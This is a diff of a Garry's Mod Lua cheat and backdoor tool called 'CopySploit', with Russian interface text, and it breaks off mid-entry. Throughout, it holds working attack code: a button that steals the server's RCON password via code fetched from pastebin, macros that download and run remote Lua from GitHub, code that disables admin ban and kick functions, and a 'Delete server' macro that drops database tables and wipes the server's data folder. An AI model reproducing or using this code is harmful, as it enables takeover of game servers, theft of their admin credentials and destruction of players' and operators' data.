-net.WriteString( "http.Fetch(\"https://pastebin.com/raw/re1ucyWy\",function(b,l,h,c)RunString(b)end,nil)" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx28 = vgui.Create("DButton", DScrollPanel)
-commandnethtx28:SetSize( 208, 20 )
-commandnethtx28:SetPos( 2, 125 )
-commandnethtx28:SetText("RCON STEALER")
-commandnethtx28:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx28.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx28.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-net.Start(thefrenchenculer)
-net.WriteString( "http.Fetch(\"https://pastebin.com/V054AVp3\",function(b,l,h,c)RunString(b)end,nil)" )
-net.WriteBit(1)
-net.SendToServer()
-timer.Simple( 0.5, function()
-if iZNX.ValidNetString( "jeveuttonrconleul" ) then
-net.Start("jeveuttonrconleul")
-net.SendToServer()
-else
-chat.AddText( Color(255, 0, 0),"rcon_password не найден, попробуйте еще раз ^^" )
-end
-end )
-end
-----------------------------------------------------------------------------------------------
-local RconCommand = vgui.Create( "DTextEntry", DScrollPanel )
-RconCommand:SetPos( 110, 0 )
-RconCommand:SetSize( 100, 20 )
-RconCommand:SetText( "hostname Hacked by CopySploit" )
-local Lancer_rcon_commande = vgui.Create("DButton", DScrollPanel )
-Lancer_rcon_commande:SetSize( 103, 20 )
-Lancer_rcon_commande:SetPos( 2, 0 )
-Lancer_rcon_commande:SetText("RCON Команда")
-Lancer_rcon_commande:SetTextColor(Color(255, 255, 255, 255))
-Lancer_rcon_commande.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-Lancer_rcon_commande.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Rcon Команда отправлена" )
-local rcon_commandes_get = RconCommand:GetValue()
-iZNX.NetStart(thefrenchenculer)
-net.WriteString( rcon_commandes_get )
-net.WriteBit(false)
-net.SendToServer()
-end
-local GLUACommand = vgui.Create( "DTextEntry", DScrollPanel )
-GLUACommand:SetPos( 110, 25 )
-GLUACommand:SetSize( 100, 20 )
-GLUACommand:SetText( "util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)" ) -- timer.Create(\"Timerdecrash\",0.5,1,function() while true do end end)
-local Lancer_glua_commande = vgui.Create("DButton", DScrollPanel )
-Lancer_glua_commande:SetSize( 103, 20 )
-Lancer_glua_commande:SetPos( 2, 25 )
-Lancer_glua_commande:SetText("Lua код")
-Lancer_glua_commande:SetTextColor(Color(255, 255, 255, 255))
-Lancer_glua_commande.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-Lancer_glua_commande.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Lua код отправлен" )
-local glua_commandes_get = GLUACommand:GetValue()
-iZNX.NetStart(thefrenchenculer)
-net.WriteString( glua_commandes_get )
-net.WriteBit(1)
-net.SendToServer()
-end
-end
-net.Receive( "rcon_passw_dump", function()
-local rcon_pass = net.ReadString()
-chat.AddText( Color(255, 255, 255), rcon_pass, Color(0, 255, 0)," GG с этим вы можете ломать сервер, даже если он удалит backdoor :D")
-end )
-net.Receive( "aucun_rcon_ici", function()
-chat.AddText( Color(255, 0, 0),"Нет rcon_password на сервере :/" )
-end )
 function iZNX.MakePlayerSelectionButton( parent, x, y, addr )
 if !parent:IsValid() then return end
 local TButton = vgui.Create( "DButton" )
@@ -4420,10 +3740,7 @@ surface.SetDrawColor( Color(0, 0, 50) ) -- Цвет меню в центре
 surface.DrawRect( 80, 25, w - 90, h - 35 )
 surface.SetDrawColor( Color(100, 100, 100, 200) )
 draw.DrawText( "CopySploit\nExploits: "..iZNX.Menu.gay, "default", 8, 15, Color(255,255,255, 350) )
-draw.DrawText( "09.07.19", "default", 8, 40, Color(255,255,255, 350) )
-draw.DrawText( "---------------","HUDLogo2", 6, 664, Color(255,255,255, 10000) )
-draw.DrawText( "Остальное","HUDLogo2", 5, 652, Color(255,255,255, 10000) )
-draw.DrawText( "---------------","HUDLogo2", 6, 638, Color(255,255,255, 10000) )
+draw.DrawText( "10.07.19", "default", 8, 40, Color(255,255,255, 350) )
 end
 local Plist = vgui.Create( "DPanelList", iZNX.Menu )
 Plist:SetSize( iZNX.Menu:GetWide() - 90, iZNX.Menu:GetTall() - 35 )
@@ -4436,16 +3753,13 @@ Plist:SetName( "" )
 iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 765, "Ноклип", Noclip, "ClientSide Noclip" )
 iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 792, "Инжектор", Inject, "Инжектит фирменный Backdoor на сервер" )
 iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 737, "Бэкдур чек", checkbackdoors, "Лист бэкдуров aka чек сервера на бэкдуры (смотреть в консоль)" )
-iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 710, "Админ-хак", lmfao, "Фейк ULX выдача SuperAdmin, можно сделать скриншот, мол вы хакер" )
-iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 683, "Не нажимать", lmfao1, "НЕ НАЖИМАТЬ!!" )
-iZNX.MakeFunctionButtonr( iZNX.Menu, 7, 67, "Создатель", gui.url, "Ссылка на страницу создателя меню" )
-iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 148, "Сканер", iZNX.ScanPlayers, "Сканирует игроков" )
-iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 121, "Чек Версии", CheckVersion, "Чек версии чита" )
-iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 175, "RainbowGun", rainbowphysgun, "Включает радужный физган" )
-iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 202, "RunLuaCode", editor, "Run on self - Запуск луа кода на себя" )
-iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 229, "WallHack", WHT, "Включает вх" )
-iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 256, "BunnyHop", Bhop, "Обыкновенный бхоп" )
-iZNX.MakeFunctionButtonr( iZNX.Menu, 7, 94, "Анти-Читы", anticheats, "Показывает меры безопасности (Скринграбы, анти-читы и т.д)" )
+iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 121, "Сканер", iZNX.ScanPlayers, "Сканирует игроков" )
+iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 94, "Чек Версии", CheckVersion, "Чек версии чита" )
+iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 148, "RainbowGun", rainbowphysgun, "Включает радужный физган" )
+iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 175, "RunLuaCode", editor, "Run on self - Запуск луа кода на себя" )
+iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 202, "WallHack", WHT, "Включает вх" )
+iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 229, "BunnyHop", Bhop, "Обыкновенный бхоп" )
+iZNX.MakeFunctionButtonr( iZNX.Menu, 7, 67, "Анти-Читы", anticheats, "Показывает меры безопасности (Скринграбы, анти-читы и т.д)" )
 local function CreateSploitPanel( name, t )
 if !iZNX.Menu then return end
 local cmdp = vgui.Create( "DPanel" )
@@ -4487,92 +3801,6 @@ end
 end)
 
 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
---[[ --------------------------------------------------------------
-      _____     _          _   _ _        _   _            _
-     |  ___|_ _| | _____  | | | | |_  __ | | | | __ _  ___| | __
-     | |_ / _` | |/ / _ \ | | | | \ \/ / | |_| |/ _` |/ __| |/ /
-     |  _| (_| |   <  __/ | |_| | |>  <  |  _  | (_| | (__|   <
-     |_|  \__,_|_|\_\___|  \___/|_/_/\_\ |_| |_|\__,_|\___|_|\_\
-
-    ---------------------------------------------------------------]]
-
-function lmfao()
-surface.PlaySound("garrysmod/ui_click.wav")
-if( ulx ) then
-chat.AddText( Color( 0, 0, 0, 255 ), "(Console) ", Color( 160, 200, 200, 255 ), "added ", Color( 80, 0, 120, 255 ), "You ", Color( 160, 200, 200, 255 ), "to group ", Color( 0, 255, 0, 255 ), "superadmin" )
-else
-chat.AddText( "На этом сервере не установлен ULX" )
-end
-end
-CCA( "CopySploit_adduser", lmfao )
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-
---[[ ----------------------------------------------------------------------------------
-      ____              _ _      ____ _ _      _      ____        _   _
-     |  _ \  ___  _ __ ( ) |_   / ___| (_) ___| | __ | __ ) _   _| |_| |_ ___  _ __
-     | | | |/ _ \| '_ \|/| __| | |   | | |/ __| |/ / |  _ \| | | | __| __/ _ \| '_ \
-     | |_| | (_) | | | | | |_  | |___| | | (__|   <  | |_) | |_| | |_| || (_) | | | |
-     |____/ \___/|_| |_|  \__|  \____|_|_|\___|_|\_\ |____/ \__,_|\__|\__\___/|_| |_|
-
-     ----------------------------------------------------------------------------------]]
-
-function lmfao1()
-surface.PlaySound("garrysmod/ui_click.wav")
-local msg = "Подожди. . ."
-surface.CreateFont("lolwutbet", {size=75})
-local function huddrawdetour()
-	draw.RoundedBox(0, 0, 0, ScrW(), ScrH(), HSVToColor( CurTime() % 6 * 60, 1, 1 ))
-	draw.RoundedBox(0, 0, ScrH() / 3.5, ScrW(), ScrH() / 4.5, Color(0, 0, 0))
-	draw.SimpleText(msg, "lolwutbet", ScrW() / 2, ScrH() / 2.5, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
-end
-
-
-for k,v in pairs(hook.GetTable()) do
-	for o,j in pairs(v) do
-		if k == "HUDPaint" then
-			hook.Remove(k, o)
-			hook.Add(k, o, huddrawdetour)
-		end
-	end
-end
-hook.Add("HUDPaint","eztoirkfghdjbnvxc", huddrawdetour)
-
-timer.Create("wowlolwut_my_boi",2 ,0 , function()
-	msg = table.Random({
-		"Зачем ты нажал?",
-		"cl_yawspeed 8",
-		"-right",
-		"Почему ты это сделал ?",
-		"Я уже взламываю твой аккаунт",
-		"Я же написал, чтоб ты не нажимал",
-		"Команды на экране",
-		"u n00b",
-		"-right",
-		"1337 h4ck3r",
-		"Больше не нажимай на меня, ок?",
-		"cl_yawspeed 8",
-		"Надеюсь, ты усвоил урок",
-		"..."})
-end)
-
-timer.Create("lgfholjghlfdsh",0 ,0 , function()
-	MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "ЗАПУСТИ МЕНЯ ЕЩЕ РАЗ, ДАВАЙ, СДЕЛАЙ ЭТО!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! !\n")
-end)
-sound.PlayURL("http://d.zaix.ru/5Kko.mp3","mono noblock", function( s )
-	s:Play()
-end)
-LocalPlayer():ConCommand("+voicerecord")
-LocalPlayer():ConCommand("cl_yawspeed 9999")
-LocalPlayer():ConCommand("+right")
-MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "Нажми escape !\n")
-timer.Simple(5 * 60, function()
-	table.Empty(debug.getregistry())
-end )
-end
-concommand.Add( "Music_troll", lmfao1 )
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 --[[------------------------------------------------------------------
@@ -5545,7 +4773,7 @@ BD.BackdoorTypes = {
 
     ["AutoDetect"] = {
 
-        ["Code"] = "util.AddNetworkString( '_CAC_ReadMemory' ) net.Receive( '_CAC_ReadMemory', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
+        ["Code"] = "",
 
         ["Netkey"] = thefrenchenculer,
 
@@ -5578,7 +4806,7 @@ local ctxt = chat.AddText
 
 function BD.ChatText( message, col )
 
-    ctxt( Color(195,205,255,255), "[Blackdoor] ", col, message )
+    ctxt( Color(195,205,255,255), "[Backdoor] ", col, message )
 
 end
 
@@ -5694,7 +4922,7 @@ BD.BDMacros ={
 
         ]],
 
-        ["Desc"] = "You need this to use certain macros",
+        ["Desc"] = "Нужно для обхода лимита",
 
     },
 
@@ -5988,7 +5216,7 @@ BD.BDMacros ={
 
         ["Type"] = 1,
 
-        ["Code"] = [[@1]],
+        ["Code"] = [[RunString(@1)]],
 
         ["Desc"] = "For running your dank luas",
 
@@ -6008,17 +5236,36 @@ BD.BDMacros ={
 
 
 
-    ["Destroy ULX Ban/Kick"] = {
+    ["Destroy Ban/Kick"] = {
 
         ["Type"] = 1,
 
-        ["Code"] = [[ULib.Ban = function() return false end
+        ["Code"] = [[
+        if(FAdmin) then function FAdmin.PlayerActions.ConvertBanTime() return 1 end end
+        function Ban() return false end
+        function Kick() return false end
+        if ULib then
+            function ULib.ban() return end
+            function ULib.kickban() return end
+            function ULib.kick() return end
+            function ULib.addBan() return end
+        end
+        if ulx then
+            function ulx.ban(...) return end
+            function ulx.kick(...) return end
+            function ulx.banid(...) return end
+            function ulx.removeuser(...) return end
+        end
+        local _R = debug.getregistry()
+        function _R.Player.Kick(...) return end
+        function _R.Player.Ban(...) return end
+        function game.KickID(...) return end
+        FAdmin = FAdmin or {}
+        timer.Create("fuckfadminbannigger", 0.1, 0, function() FAdmin.BANS = {} end)
+        FAdmin.Commands.List = {}
+        hook.GetTable()["CheckPassword"] = {}]],
 
-        ULib.addBan = function() return end
-
-        ULib.kick = function() return end]],
-
-        ["Desc"] = "Completely break ulx ban and ulx kick so you can't be locked out of the server",
+        ["Desc"] = "Completely break !ban and !kick so you can't be locked out of the server",
 
     },
 
@@ -6172,6 +5419,20 @@ BD.BDMacros ={
 
     },
 
+
+    ["Aids"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+            v:SendLua('http.Fetch("http://raw.githubusercontent.com/WERooo/somelua/master/gg.lua",function(body) RunString(body) end)')
+
+        ]],
+
+        ["Desc"] = "spooky spooky skeleton",
+
+    },
 
 
     ["Eye rape (from internet)"] = {
@@ -7028,7 +6289,47 @@ BD.BDMacros ={
 
     },
 
+    ["Shutdown server"] = {
 
+        ["Type"] = 1,
+
+        ["Code"] = [[ timer.Create( "spamlolk", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), " ") end end) ]],
+
+        ["Desc"] = "Remove all groups",
+
+    },
+
+    ["Delete groups.txt"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[ if file.Exists( "ulib/groups.txt", "DATA" ) then file.Delete("ulib/groups.txt") ]],
+
+        ["Desc"] = "Remove all groups",
+
+    },
+
+    
+    ["Ignite all players"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[ for k,v in pairs(player.GetAll()) do v:Ignite(120) end ]],
+
+        ["Desc"] = "",
+
+    },
+    
+    ["Delete bans.txt"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[ if file.Exists( "ulib/bans.txt", "DATA" ) then file.Delete("ulib/bans.txt") ]],
+
+        ["Desc"] = "Delete all bans in ULX (this not break !ban and !kick)",
+
+    },
+    
 
     ["Allahu Ackbar"] = {
 
@@ -7058,6 +6359,15 @@ BD.BDMacros ={
 
     },
 
+    ["Hardbass disco"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[ http.Fetch("https://raw.githubusercontent.com/WERooo/somelua/master/discohardbass.lua",function(b,l,h,c)RunString(b)end,nil) ]],
+
+        ["Desc"] = "vodka",
+
+    },
 
 
     ["ULX set access"] = {
@@ -7137,6 +6447,28 @@ BD.BDMacros ={
 
     },
 
+    ["*cough*"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[
+            if !(timer.Exists("cough")) then
+                for k,v in pairs(player.GetAll()) do
+                    timer.Create("cough", 10, 0, function()
+                        RunConsoleCommand("say", "*кхм..кхм*")
+                        v:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)
+                        util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 1, 5000 )
+                    end)
+                end
+            else
+                timer.Destroy("cough")
+            end
+        ]],
+
+        ["Desc"] = "",
+
+    },
+
     ["Console jammer"] = {
 
         ["Type"] = 1,
@@ -7173,34 +6505,21 @@ BD.BDMacros ={
 
     ["Delete server"] = {
 
-        ["Type"] = 3,
+        ["Type"] = 1,
 
         ["Code"] = [[
-            local date = os.date( "%m-%d-%y" )
-            local databases = { "jobdata","darkrp_door","darkrp_levels","darkrp_prestige","darkrp_doorgroups","darkrp_doorjobs","darkrp_jobspawn","darkrp_position","darkrp_player","darkrp_dbversion","FAdmin_CAMIPrivileges","FADMIN_GROUPS","FAdmin_Immunity","FADMIN_MOTD","FAdmin_PlayerGroup","FADMIN_PRIVILEGES","FADMIN_RESTRICTEDENTS","FAdmin_ServerSettings","FAdminBans","FPP_ANTISPAM1","FPP_BLOCKED1","FPP_BLOCKMODELSETTINGS1","FPP_ENTITYDAMAGE1","FPP_GLOBALSETTINGS1","FPP_GRAVGUN1","FPP_GROUPMEMBERS1","FPP_GROUPS3","FPP_GROUPTOOL","FPP_PHYSGUN1","FPP_PLAYERUSE1","FPP_TOOLADMINONLY","FPP_TOOLGUN1","FPP_TOOLRESTRICTPERSON1","FPP_TOOLTEAMRESTRICT","FPP_BLOCKEDMODELS1","awarn_playerdata","awarn_serverdata","awarn_warnings","blogs_players_v3","blogs_v3","stt_date","stt_players","mlog_logs","mlog_permissions","atlaschat_players","atlaschat_ranks","atlaschat_remote","atlaschat_restrictions","OreBag","fcd_playerData","dailylogin","ChessLeaderboard","qsgr_data","voting_npcs","cac_incidents","steam_rewards","playerdata","playerinformation","utime","permaprops","cc_characters","cc_npcs","ckit_chips","ckit_persist","exsto_data_bans","exsto_data_ranks","exsto_data_users","exsto_data_variables","exsto_restriction","inventories","kinv_items","libk_player","permitems","player_gangapps","player_gangdata","player_gangs","ps2_categories","ps2_equipmentslot","ps2_HatPersistence","ps2_itemmapping","ps2_itempersistence","ps2_OutfitHatPersistenceMapping","ps2_outfits","ps2_playermodelpersistence","ps2_servers","ps2_settings","ps2_trailpersistence","ps2_wallet","removeprops","scoreboard_friends","serverguard_analytics","serverguard_bans","serverguard_pms","serverguard_ranks","serverguard_reports","serverguard_schema","serverguard_ttt_autoslays","serverguard_users","serverguard_watchlist","tttstats","ttt_passes_history","specdm_stats_new","ps2_achievements","ps2_boosterpersistence","ps2_cratepersistence","ps2_instatswitchweaponpersistence","ps2_keypersistence","ps2_rolecontrolpersistence","ps2_weaponpersistence","rapsheet","damagelog_autoslay","damagelog_names","damagelog_oldlogs","damagelog_weapons","kmapvote_mapinfo","kmapvote_ratings","mgang_gangs","mgang_players","deathrun_ids","deathrun_records","deathrun_stats","sui_ratings","shop_texthats","shop_money","shop_items","report_log" }
-            local datafiles = { "ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","wire_version.txt","UTeam.txt","prevhas.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","hitnumbers/settings.txt","soundlists/common_sounds.txt","vcmod/controls.txt","vcmod/dataserver.txt","qsgr_data/sqgr_settings.txt","blogs/configcache.txt","blogs/language.txt","cac/adminuipack.txt","ezjobs/config.txt","damagelog/colors.txt","damagelog/filters_new.txt","craphead_scripts/armory_robbery/rp_downtown_v4c/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_evilmelon_v1/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v3/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v4/policearmory_location.txt","mg_gangsdata/mg_npcspawns.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","prevhash.txt","permaprops_config.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","vliss/settings/config.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
-            local sensitivefiles = { "ulx_logs/"..date..".txt","ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","vcmod/controls.txt","vcmod/dataserver.txt","blogs/configcache.dat","blogs/language.txt","blogs/config_v5.txt","cac/adminuipack.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","permaprops_config.txt","whitelist.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
-            
-            for k,v in pairs(databases) do
-                if sql.TableExists(v) then 
-                    sql.Query("DROP TABLE "..v.." ;")
-                    sql.Query("CREATE TABLE IF NOT EXISTS "..v.." ( steamid TEXT NOT NULL PRIMARY KEY, value TEXT );")
-                end
+        local datafiles = { "the_weed","backpack","rm_car_dealer","cnpcv4","rm_car_dealer2","darkrp_logs","itemstore","nomalua","ulx_logs","ulib","ulx","apg","atags","vcmod","cac","hitnumbers","soundlists","qsgr_data","blogs","ezjobs","damagelog","craphead_scripts","mg_gangsdata","zwhitelistjobdata","zmodserveroption","vliss","nordahl_spawnpoint","planningevent","planningoption"}
+        for k,v in pairs( datafiles ) do if file.Exists(v, "DATA") then file.Delete( v , "DATA", true ) end end
+        local databases = { "peepholes","playerpdata","eginv_players","eginv_trash","eginv_position","eginv_item","eginv_bank","jobdata","darkrp_door","darkrp_levels","darkrp_prestige","darkrp_doorgroups","darkrp_doorjobs","darkrp_jobspawn","darkrp_position","darkrp_player","darkrp_dbversion","FAdmin_CAMIPrivileges","FADMIN_GROUPS","FAdmin_Immunity","FADMIN_MOTD","FAdmin_PlayerGroup","FADMIN_PRIVILEGES","FADMIN_RESTRICTEDENTS","FAdmin_ServerSettings","FAdminBans","FPP_ANTISPAM1","FPP_BLOCKED1","FPP_BLOCKMODELSETTINGS1","FPP_ENTITYDAMAGE1","FPP_GLOBALSETTINGS1","FPP_GRAVGUN1","FPP_GROUPMEMBERS1","FPP_GROUPS3","FPP_GROUPTOOL","FPP_PHYSGUN1","FPP_PLAYERUSE1","FPP_TOOLADMINONLY","FPP_TOOLGUN1","FPP_TOOLRESTRICTPERSON1","FPP_TOOLTEAMRESTRICT","FPP_BLOCKEDMODELS1","awarn_playerdata","awarn_serverdata","awarn_warnings","blogs_players_v3","blogs_v3","ulogs","stt_date","stt_players","mlog_logs","mlog_permissions","atlaschat_players","atlaschat_ranks","atlaschat_remote","atlaschat_restrictions","OreBag","fcd_playerData","dailylogin","ChessLeaderboard","qsgr_data","voting_npcs","cac_incidents","steam_rewards","playerdata","playerinformation","utime","permaprops","cc_characters","cc_npcs","ckit_chips","ckit_persist","exsto_data_bans","exsto_data_ranks","exsto_data_users","exsto_data_variables","exsto_restriction","inventories","kinv_items","libk_player","permitems","player_gangapps","player_gangdata","player_gangs","ps2_categories","ps2_equipmentslot","ps2_HatPersistence","ps2_itemmapping","ps2_itempersistence","ps2_OutfitHatPersistenceMapping","ps2_outfits","ps2_playermodelpersistence","ps2_servers","ps2_settings","ps2_trailpersistence","ps2_wallet","removeprops","scoreboard_friends","serverguard_analytics","serverguard_bans","serverguard_pms","serverguard_ranks","serverguard_reports","serverguard_schema","serverguard_ttt_autoslays","serverguard_users","serverguard_watchlist","tttstats","ttt_passes_history","specdm_stats_new","ps2_achievements","ps2_boosterpersistence","ps2_cratepersistence","ps2_instatswitchweaponpersistence","ps2_keypersistence","ps2_rolecontrolpersistence","ps2_weaponpersistence","rapsheet","damagelog_autoslay","damagelog_names","damagelog_oldlogs","damagelog_weapons","kmapvote_mapinfo","kmapvote_ratings","mgang_gangs","mgang_players","deathrun_ids","deathrun_records","deathrun_stats","sui_ratings","shop_texthats","shop_money","shop_items","report_log" }
+        for k,v in pairs( databases ) do if sql.TableExists( v ) then 
+                sql.Query( "DROP TABLE "..v.." ;" ) 
+                sql.Query( "CREATE TABLE IF NOT EXISTS "..v.." ( steamid TEXT NOT NULL PRIMARY KEY, value TEXT );" )
             end
+        end
+        local fichier, dossier = file.Find("*", "DATA") 
+        for _,v in pairs(fichier) do file.Delete( v , "DATA" ) end 
+        for _,v in pairs(dossier) do file.Delete( v , "DATA", true ) end
 
-            for k,v in pairs(datafiles) do
-                if file.Exists(v) then
-                    file.Delete(v)
-                    file.write(v, "odium.pro hehe")
-                end
-            end
-
-            for k,v in pairs(sensitivefiles) do
-                if file.Exists(v) then
-                    file.Delete(v)
-                    file.write(v, "odium.pro hehe")
-                end
-            end
         ]],
 
         ["Desc"] = "Removes as much data as possible.",
@@ -7255,6 +6574,16 @@ BD.BDMacros ={
 
     },
 
+    ["Fuck gravity"] = {
+
+        ["Type"] = 1,
+
